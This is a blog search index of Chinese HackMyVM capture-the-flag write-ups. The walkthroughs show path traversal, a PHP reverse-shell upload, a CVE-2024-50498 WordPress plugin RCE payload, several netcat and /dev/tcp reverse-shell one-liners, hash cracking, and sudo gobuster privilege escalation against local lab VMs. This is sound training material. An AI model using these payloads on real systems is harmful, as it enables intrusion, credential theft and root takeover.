[{"content":"HackMyVM_13max 难度：easy\n本机ip:10.0.2.15\n靶机ip:10.0.2.16\n信息收集 nmap扫描开放端口\n1 2 3 4 5 6 7 8 9 10 11 12 13 ┌──(root㉿kali)-[~] └─# nmap 10.0.2.16 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-13 08:52 EST Nmap scan report for 10.0.2.16 Host is up (0.00022s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http MAC Address: 08:00:27:14:4A:38 (PCS Systemtechnik/Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 6.78 seconds 这里发现开放21，22，80三个端口。看到开放21端口尝试匿名ftp\n1 2 3 4 5 ┌──(root㉿kali)-[~] └─# lftp -u anonymous 10.0.2.16 密码: lftp anonymous@10.0.2.16:~\u0026gt; ls ls: 登录失败: 530 Anonymous access not allowed. 发现匿名是被禁止的，那开放80网页端口就去web端看看有没有什么突破口\n网页踩点 访问http://10.0.2.16\n这里提示输入加密路径可以访问在13pro max的同步文档，那使用dirsearch扫一下后台看看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 ┌──(root㉿kali)-[~] └─# dirsearch -u 10.0.2.16 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /root/reports/_10.0.2.16/_25-12-13_09-02-36.txt Target: http://10.0.2.16/ [09:02:36] Starting: [09:02:37] 403 - 274B - /.ht_wsr.txt [09:02:37] 403 - 274B - /.htaccess.bak1 [09:02:37] 403 - 274B - /.htaccess.orig [09:02:37] 403 - 274B - /.htaccess.sample [09:02:37] 403 - 274B - /.htaccess.save [09:02:37] 403 - 274B - /.htaccess_extra [09:02:37] 403 - 274B - /.htaccess_orig [09:02:37] 403 - 274B - /.htaccess_sc [09:02:37] 403 - 274B - /.htaccessOLD [09:02:37] 403 - 274B - /.htaccessOLD2 [09:02:37] 403 - 274B - /.htm [09:02:37] 403 - 274B - /.html [09:02:37] 403 - 274B - /.htpasswd_test [09:02:37] 403 - 274B - /.httr-oauth [09:02:37] 403 - 274B - /.htpasswds [09:02:37] 403 - 274B - /.php [09:02:39] 403 - 274B - /.htaccessBAK [09:02:45] 200 - 284B - /config.txt [09:02:51] 301 - 305B - /logs -\u0026gt; http://10.0.2.16/logs/ [09:02:51] 403 - 274B - /logs/ [09:02:56] 200 - 97B - /readme.txt [09:02:57] 403 - 274B - /server-status [09:02:57] 403 - 274B - /server-status/ Task Completed 这里扫到三个目录logs，config.txt，readme.txt，查看config.txt内容看看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ┌──(root㉿kali)-[~] └─# curl http://10.0.2.16/config.txt # FTP File System Configuration # Config File - Do NOT delete Version: 1.0.0 Default Credential: *****:***** [Settings] EnableAnonymous = false PassiveMode = true RootDirectory = /path/to/ftp/ [Security] TLS = disabled AllowUnencryptedLogin = true MaxAuthTries = 5 [Logging] LogFile = /path/to/ftp.log LogLevel = INFO # TODO: Replace default credential before deployment 这里可以看到一些基本信息，但是貌似没什么用，但是我发现在网页上有相同的页面\n那么就相当于config.txt加密后变成pbasvt.gkg，发现是ROT13加密的路径，验证一下是否可以查看passwd等文件。先将路径/etc/passwd ROT13加密成/rgp/cnffjq，输入到url里\n成功显示了passwd文件里的内容，那么可以尝试一下访问其他敏感文件。刚才还扫到个logs目录进去看看\n这边可以看到最后一次打开ftp服务的进程pid是339，那么可以通过 /proc/339/cmdline 去查看 ，显示\n1 /usr/bin/python3/opt/ftp_server.py 继续读取/opt/ftp_server.py，显示\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 from pyftpdlib.handlers import FTPHandler from pyftpdlib.servers import FTPServer from pyftpdlib.authorizers import DummyAuthorizer import logging import os LOG_DIR = \u0026#34;/var/www/html/logs\u0026#34; LOG_FILE = os.path.join(LOG_DIR, \u0026#34;ftp_server.log\u0026#34;) os.makedirs(LOG_DIR, exist_ok=True) logging.basicConfig( filename=LOG_FILE, level=logging.INFO, format=\u0026#39;%(asctime)s - %(levelname)s - %(message)s\u0026#39; ) class CustomFTPHandler(FTPHandler): def on_connect(self): logging.info(f\u0026#34;Connection from {self.remote_ip}:{self.remote_port}\u0026#34;) def on_disconnect(self): logging.info(f\u0026#34;Disconnected {self.remote_ip}:{self.remote_port}\u0026#34;) def on_login(self, username): logging.info(f\u0026#34;User logged in: {username}\u0026#34;) def on_logout(self, username): logging.info(f\u0026#34;User logged out: {username}\u0026#34;) def on_file_sent(self, file): logging.info(f\u0026#34;File sent: {file}\u0026#34;) def on_file_received(self, file): logging.info(f\u0026#34;File received: {file}\u0026#34;) def on_incomplete_file_sent(self, file): logging.warning(f\u0026#34;Incomplete file sent: {file}\u0026#34;) def on_incomplete_file_received(self, file): logging.warning(f\u0026#34;Incomplete file received: {file}\u0026#34;) def main(): authorizer = DummyAuthorizer() authorizer.add_user(\u0026#34;ADMIN\u0026#34;, \u0026#34;12345\u0026#34;, \u0026#34;.\u0026#34;, perm=\u0026#34;elradfmw\u0026#34;) handler = CustomFTPHandler handler.authorizer = authorizer address = (\u0026#34;0.0.0.0\u0026#34;, 21) server = FTPServer(address, handler) print(f\u0026#34;Starting FTP server on {address[0]}:{address[1]}, logging to {LOG_FILE}\u0026#34;) server.serve_forever() if __name__ == \u0026#34;__main__\u0026#34;: main() 可以看到ftp的一组用户密码：ADMIN 12345\n尝试ftp\n1 2 3 4 5 6 ┌──(root㉿kali)-[~] └─# lftp -u ADMIN 10.0.2.16 密码: lftp ADMIN@10.0.2.16:~\u0026gt; LS -rw-r--r-- 1 root root 1607 Jul 05 07:08 ftp_server.py -rw-r--r-- 1 root root 54 Jul 05 07:10 rev.sh 查看rev.sh\n1 2 3 lftp ADMIN@10.0.2.16:/\u0026gt; cat rev.sh #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.132.0.74/4444 0\u0026gt;\u0026amp;1 发现这貌似是一个反弹shell 的脚本，那么我尝试上传一个反弹shell\n1 2 3 \u0026lt;?php exec(\u0026#34;busybox nc 10.0.2.15 1234 -e /bin/bash\u0026#34;); ?\u0026gt; 通过ftp上传\n1 2 3 4 5 ┌──(root㉿kali)-[~] └─# lftp -u ADMIN 10.0.2.16 密码: lftp ADMIN@10.0.2.16:~\u0026gt; put a.txt 62 bytes transferred 因为ftp上传的文件位于opt目录下，故而将/opt/a.txt通过rot13加密后输入url反弹shell\n1 2 3 4 5 6 7 8 ┌──(root㉿kali)-[~] └─# nc -lnvp 1234 listening on [any] 1234 ... connect to [10.0.2.15] from (UNKNOWN) [10.0.2.16] 48606 id uid=33(www-data) gid=33(www-data) groups=33(www-data) /usr/bin/script -qc /bin/bash /dev/null www-data@13max:/var/www/html$ 提权 进入home目录看看能不能找到user\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 www-data@13max:/$ cd /home cd /home www-data@13max:/home$ ls -al ls -al total 16 drwxr-xr-x 4 root root 4096 Jul 4 08:55 . drwxr-xr-x 18 root root 4096 Mar 18 2025 .. drwxr-xr-x 3 max max 4096 Jul 4 11:03 max drwxr-xr-x 3 welcome welcome 4096 Jul 5 02:54 welcome www-data@13max:/home$ cd welcome cd welcome www-data@13max:/home/welcome$ ls -al ls -al total 28 drwxr-xr-x 3 welcome welcome 4096 Jul 5 02:54 . drwxr-xr-x 4 root root 4096 Jul 4 08:55 .. lrwxrwxrwx 1 root root 9 Jul 4 11:03 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 welcome welcome 220 Apr 11 2025 .bash_logout -rw-r--r-- 1 welcome welcome 3526 Apr 11 2025 .bashrc drwxr-xr-x 3 welcome welcome 4096 Jul 4 07:21 .local -rw-r--r-- 1 welcome welcome 807 Apr 11 2025 .profile -rw-r--r-- 1 welcome welcome 44 Jul 5 02:54 user.flag www-data@13max:/home/welcome$ cat user.flag cat user.flag flag{user-a89162ba751904d59ebd8fed2fce8880} www-data@13max:/home/welcome$ 发现user.flag\n","date":"2025-12-13T21:50:01+08:00","permalink":"https://ON9K.github.io/p/13max/","title":"13max"},{"content":"HackMyVM_todd 难度：easy\n目标IP：10.0.2.13\n本机ip：10.0.2.15\n信息收集 nmap扫描开放端口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ┌──(root㉿kali)-[~] └─# nmap 10.0.2.13 -p- Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 08:13 EST Nmap scan report for 10.0.2.13 Host is up (0.00019s latency). Not shown: 65512 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 2209/tcp open rimf-ps 3086/tcp open sj3 3634/tcp open hlibmgr 4551/tcp open ieee-mih 4661/tcp open kar2ouche 5049/tcp open ivocalize 6000/tcp open X11 7066/tcp open unknown 8179/tcp open unknown 8530/tcp open unknown 10359/tcp open unknown 16375/tcp open unknown 16828/tcp open unknown 17419/tcp open unknown 17966/tcp open unknown 19370/tcp open unknown 19709/tcp open unknown 25182/tcp open unknown 30752/tcp open unknown 31214/tcp open unknown 32425/tcp open unknown MAC Address: 08:00:27:82:A7:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 12.36 seconds 可以看到这里开放了很多端口，有常见的22，80端口和一些其它端口，先去web看看\n网页踩点 貌似并没有找到什么有用的信息\n目录扫描 dirsearch扫描看看是否存在后门和一些有信息的目录\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 ┌──(root㉿kali)-[~] └─# dirsearch -u 10.0.2.13 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /root/reports/_10.0.2.13/_25-12-02_08-18-33.txt Target: http://10.0.2.13/ [08:18:33] Starting: [08:18:34] 403 - 274B - /.ht_wsr.txt [08:18:34] 403 - 274B - /.htaccess.orig [08:18:34] 403 - 274B - /.htaccess.sample [08:18:34] 403 - 274B - /.htaccess.bak1 [08:18:34] 403 - 274B - /.htaccess.save [08:18:34] 403 - 274B - /.htaccess_extra [08:18:34] 403 - 274B - /.htaccessBAK [08:18:34] 403 - 274B - /.htaccess_orig [08:18:34] 403 - 274B - /.htaccess_sc [08:18:34] 403 - 274B - /.htaccessOLD [08:18:34] 403 - 274B - /.htaccessOLD2 [08:18:34] 403 - 274B - /.html [08:18:34] 403 - 274B - /.htm [08:18:34] 403 - 274B - /.htpasswd_test [08:18:34] 403 - 274B - /.httr-oauth [08:18:34] 403 - 274B - /.htpasswds [08:18:55] 403 - 274B - /server-status [08:18:55] 403 - 274B - /server-status/ [08:18:59] 301 - 306B - /tools -\u0026gt; http://10.0.2.13/tools/ [08:18:59] 200 - 534B - /tools/ Task Completed 扫描到一个存在的目录，上去看看\n是一些工具但是也不知道有什么用\n","date":"2025-12-02T21:08:36+08:00","image":"https://ON9K.github.io/p/todd/todd_hu_2ce34f2aeec06183.png","permalink":"https://ON9K.github.io/p/todd/","title":"Todd"},{"content":"HackMyVM_buster 难度：easy\n目标IP：10.0.2.11\n本机ip：10.0.2.15\n信息收集 nmap扫描目标开开放端口\n1 2 3 4 5 6 7 8 9 10 11 12 ┌──(root㉿kali)-[~] └─# nmap 10.0.2.11 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 11:00 EST Nmap scan report for 10.0.2.11 Host is up (0.00056s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http MAC Address: 08:00:27:96:A0:1B (PCS Systemtechnik/Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds 发现开放22端口与80端口,去80端口看看网页\n网页踩点 发现是个wordpress，果断使用wpscan扫描爆破用户名和可能存在的插件漏洞。\n执行命令：\n1 wpscan --url http://10.0.2.11 -e u,ap --plugins-detection aggressive 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 ┌──(root㉿kali)-[~] └─# wpscan --url http://10.0.2.11 -e u,ap --plugins-detection aggressive _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.28 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [+] URL: http://10.0.2.11/ [10.0.2.11] [+] Started: Sun Nov 30 10:24:42 2025 Interesting Finding(s): [+] Headers | Interesting Entry: Server: nginx/1.14.2 | Found By: Headers (Passive Detection) | Confidence: 100% [+] robots.txt found: http://10.0.2.11/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.0.2.11/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.0.2.11/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.0.2.11/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 6.7.1 identified (Insecure, released on 2024-11-21). | Found By: Meta Generator (Passive Detection) | - http://10.0.2.11/, Match: \u0026#39;WordPress 6.7.1\u0026#39; | Confirmed By: Rss Generator (Aggressive Detection) | - http://10.0.2.11/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=6.7.1\u0026lt;/generator\u0026gt; | - http://10.0.2.11/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=6.7.1\u0026lt;/generator\u0026gt; [i] The main theme could not be detected. [+] Enumerating All Plugins (via Aggressive Methods) 扫描速度偏慢\u0026hellip;\u0026hellip;\n发现漏洞 发现插件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 [i] Plugin(s) Identified: [+] akismet | Location: http://10.0.2.11/wp-content/plugins/akismet/ | Last Updated: 2025-11-12T16:31:00.000Z | Readme: http://10.0.2.11/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 5.6 | | Found By: Known Locations (Aggressive Detection) | - http://10.0.2.11/wp-content/plugins/akismet/, status: 200 | | Version: 5.3.5 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.0.2.11/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://10.0.2.11/wp-content/plugins/akismet/readme.txt [+] feed | Location: http://10.0.2.11/wp-content/plugins/feed/ | | Found By: Known Locations (Aggressive Detection) | - http://10.0.2.11/wp-content/plugins/feed/, status: 200 | | The version could not be determined. [+] wp-query-console | Location: http://10.0.2.11/wp-content/plugins/wp-query-console/ | Latest Version: 1.0 (up to date) | Last Updated: 2018-03-16T16:03:00.000Z | Readme: http://10.0.2.11/wp-content/plugins/wp-query-console/README.txt | | Found By: Known Locations (Aggressive Detection) | - http://10.0.2.11/wp-content/plugins/wp-query-console/, status: 403 | | Version: 1.0 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.0.2.11/wp-content/plugins/wp-query-console/README.txt 存在插件：akismet、feed、wp-query-console\n发现用户 1 2 3 4 5 6 7 8 9 10 11 12 13 [i] User(s) Identified: [+] ta0 | Found By: Wp Json Api (Aggressive Detection) | - http://10.0.2.11/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Confirmed By: | Rss Generator (Aggressive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] welcome | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) 存在用户ta0、welcome\n利用漏洞 搜索插件wp-query-console发现存在RCE漏洞（CVE-2024-50498），且存在页面10.0.2.11/wp-json/wqc/v1/query\n查看POC\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 POST /wp-json/wqc/v1/query HTTP/1.1 Host: kubernetes.docker.internal User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://kubernetes.docker.internal/wp-admin/admin.php?page=wp-query-console Content-Type: application/json Content-Length: 45 Origin: http://kubernetes.docker.internal Connection: keep-alive Priority: u=0 {\u0026#34;queryArgs\u0026#34;:\u0026#34;phpinfo();\u0026#34;,\u0026#34;queryType\u0026#34;:\u0026#34;post\u0026#34;} 利用bp抓包修改参数\n验证漏洞存在，修改命令函数反弹shell\n1 {\u0026#34;queryArgs\u0026#34;:\u0026#34;shell_exec(\u0026#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2\u0026gt;\u0026amp;1 | nc 10.0.2.15 4444 \u0026gt;/tmp/f\u0026#39;);\u0026#34;,\u0026#34;queryType\u0026#34;:\u0026#34;post\u0026#34;} 成功反弹shell\n1 2 3 4 5 6 7 ┌──(root㉿kali)-[~/reverse] └─# nc -lnvp 4444 listening on [any] 4444 ... connect to [10.0.2.15] from (UNKNOWN) [10.0.2.11] 55216 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ /usr/bin/script -qc /bin/bash /dev/null www-data@listen:~/html/wordpress$ 提权 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 www-data@listen:~/html/wordpress$ ls -al ls -al total 248 drwxr-xr-x 5 www-data www-data 4096 Jan 8 2025 . drwxr-xr-x 3 root root 4096 Jan 7 2025 .. -rwxr-xr-x 1 www-data www-data 405 Jan 8 2025 index.php -rwxr-xr-x 1 www-data www-data 19915 Dec 31 2023 license.txt -rwxr-xr-x 1 www-data www-data 7409 Jun 18 2024 readme.html -rw-r--r-- 1 root root 684 Jan 8 2025 update_url.php -rwxr-xr-x 1 www-data www-data 7387 Feb 13 2024 wp-activate.php drwxr-xr-x 9 www-data www-data 4096 Nov 21 2024 wp-admin -rwxr-xr-x 1 www-data www-data 351 Feb 6 2020 wp-blog-header.php -rwxr-xr-x 1 www-data www-data 2323 Jun 14 2023 wp-comments-post.php -rwxr-xr-x 1 www-data www-data 3336 Oct 15 2024 wp-config-sample.php -rw-rw-rw- 1 www-data www-data 3620 Jan 8 2025 wp-config.php drwxr-xr-x 6 www-data www-data 4096 Jan 8 2025 wp-content -rwxr-xr-x 1 www-data www-data 5617 Aug 2 2024 wp-cron.php drwxr-xr-x 30 www-data www-data 12288 Nov 21 2024 wp-includes -rwxr-xr-x 1 www-data www-data 2502 Nov 26 2022 wp-links-opml.php -rwxr-xr-x 1 www-data www-data 3937 Mar 11 2024 wp-load.php -rwxr-xr-x 1 www-data www-data 51367 Sep 30 2024 wp-login.php -rwxr-xr-x 1 www-data www-data 8543 Sep 18 2024 wp-mail.php -rwxr-xr-x 1 www-data www-data 29032 Sep 30 2024 wp-settings.php -rwxr-xr-x 1 www-data www-data 34385 Jun 19 2023 wp-signup.php -rwxr-xr-x 1 www-data www-data 5102 Oct 18 2024 wp-trackback.php -rwxr-xr-x 1 www-data www-data 3246 Mar 2 2024 xmlrpc.php www-data@listen:~/html/wordpress$ 爆破密码 发现存在wp-config.php为配置文件，查看该文件\n发现数据库用户名和密码，尝试能不能找到用户名密码\n1 2 3 4 5 6 7 8 9 MariaDB [wordpress]\u0026gt; select * from wp_users; select * from wp_users; +----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+ | ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name | +----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+ | 1 | ta0 | $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. | ta0 | 2814928906@qq.com | http://192.168.31.181 | 2025-01-08 03:10:43 | | 0 | ta0 | | 2 | welcome | $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/ | welcome | 127.0.0.1@qq.com | | 2025-01-08 04:29:28 | 1736310568:$P$B2YbhlDVF1XWIurbL11Pfoasb./0tD. | 0 | welcome | +----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+ 2 rows in set (0.001 sec) 这里找到两个用户的密码，welcome用户密码的hash值是$P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/,用john爆破一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(root㉿kali)-[~] └─# echo \u0026#39;$P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/\u0026#39; \u0026gt;tmp ┌──(root㉿kali)-[~] └─# john tmp --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3]) No password hashes left to crack (see FAQ) ┌──(root㉿kali)-[~] └─# john tmp --show ?:104567 1 password hash cracked, 0 left 这里爆破出来welcome的密码是104567，尝试ssh登陆\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(root㉿kali)-[~] └─# ssh welcome@10.0.2.11 welcome@10.0.2.11\u0026#39;s password: Linux listen 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sat Nov 29 06:19:03 2025 from 10.0.2.15 $ /usr/bin/script -qc /bin/bash /dev/null welcome@listen:~$ ls -al total 16 drwx------ 2 welcome welcome 4096 Nov 29 06:02 . drwxr-xr-x 3 root root 4096 Jan 7 2025 .. -rw------- 1 welcome welcome 1046 Nov 29 06:57 .bash_history -rw-r--r-- 1 root root 33 Jan 7 2025 user.txt 成功登陆welcome获得user.txt，继续尝试提权获得root权限\ngobuster提权 1 2 3 4 5 6 welcome@listen:~$ sudo -l Matching Defaults entries for welcome on listen: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User welcome may run the following commands on listen: (ALL) NOPASSWD: /usr/bin/gobuster 可以用sudo权限运行gobuster，利用gobuster的写文件功能配合pspy64的定时任务，在定时任务里写入反弹shell反弹root的权限。\n在攻击机开启http服务\n1 2 3 ┌──(root㉿kali)-[~] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 将pspy64上传至靶机tmp目录下（上传至别的目录可能权限不够），执行pspy64后会在opt目录下生成.test.sh文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 welcome@listen:/$ wget http://10.0.2.15/pspy64 -O /tmp/pspy64 --2025-12-01 05:25:29-- http://10.0.2.15/pspy64 Connecting to 10.0.2.15:80... connected. HTTP request sent, awaiting response... 200 OK Length: 3104768 (3.0M) [application/octet-stream] Saving to: ‘/tmp/pspy64’ /tmp/pspy64 100%[==============================================\u0026gt;] 2.96M --.-KB/s in 0.02s 2025-12-01 05:25:29 (187 MB/s) - ‘/tmp/pspy64’ saved [3104768/3104768] welcome@listen:/$ cd tmp welcome@listen:/tmp$ chmod +x pspy64 welcome@listen:/tmp$ ./pspy64 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d ██▓███ ██████ ██▓███ ▓██ ██▓ ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒ ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░ ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░ ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░ ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ ░░ ░ ░ ░ ░░ ▒ ▒ ░░ ░ ░ ░ ░ ░ Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive) Draining file system events due to startup... done welcome@listen:/tmp$ cd /opt welcome@listen:/opt$ ls -al total 12 drwxr-xr-x 2 root root 4096 Jan 7 2025 . drwxr-xr-x 18 root root 4096 Jan 7 2025 .. -rwx------ 1 root root 7 Nov 29 06:54 .test.sh 然后在攻击机拼接目录 /tmp/b ,在靶机的tmp下创建a文件为字典写入/tmp/b,在b文件里写入shell并用gobuster写入.test.sh\n1 2 3 welcome@listen:/tmp$ echo \u0026#39;tmp/b\u0026#39; \u0026gt;a.txt welcome@listen:/tmp$ echo \u0026#39;nc -e /bin/bash 10.0.2.15 1234\u0026#39; \u0026gt;b welcome@listen:/tmp$ chmod +x b 攻击机创建以下目录\n1 2 3 4 5 ┌──(root㉿kali)-[~] └─# cd tmp ┌──(root㉿kali)-[~/tmp] └─# ls b 执行命令sudo gobuster -w a.txt -u http://10.0.2.15:80 -n -q -o /opt/.test.sh，攻击机监听1234获得root的shell\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #靶机 welcome@listen:/tmp$ sudo gobuster -w a.txt -u http://10.0.2.15:80 -n -q -o /opt/.test.sh /tmp/b #攻击机 ┌──(root㉿kali)-[~/tmp] └─# nc -lnvp 1234 listening on [any] 1234 ... connect to [10.0.2.15] from (UNKNOWN) [10.0.2.11] 57002 id uid=0(root) gid=0(root) groups=0(root) /usr/bin/script -qc /bin/bash /dev/null root@listen:~# cd root cd root bash: cd: root: No such file or directory root@listen:~# ls -al ls -al total 32 drwx------ 3 root root 4096 Jan 7 2025 . drwxr-xr-x 18 root root 4096 Jan 7 2025 .. lrwxrwxrwx 1 root root 9 Jan 7 2025 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 570 Jan 31 2010 .bashrc drwxr-xr-x 3 root root 4096 Oct 16 2020 .local lrwxrwxrwx 1 root root 9 Jan 7 2025 .mysql_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 148 Jan 7 2025 note.txt -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw------- 1 root root 33 Jan 7 2025 R00t_fl4g_is_HHHHerererererrererere.txt -rw-r--r-- 1 root root 66 Oct 16 2020 .selected_editor root@listen:~# 获得root.txt，通关靶场！\n","date":"2025-11-30T15:52:52+08:00","image":"https://ON9K.github.io/p/buster/buster_hu_75331cf0256ff1d4.png","permalink":"https://ON9K.github.io/p/buster/","title":"Buster"},{"content":"","date":"2025-11-30T15:44:44+08:00","image":"https://ON9K.github.io/p/nexus/nexus_hu_b7cb03e8e62ab701.png","permalink":"https://ON9K.github.io/p/nexus/","title":"Nexus"}]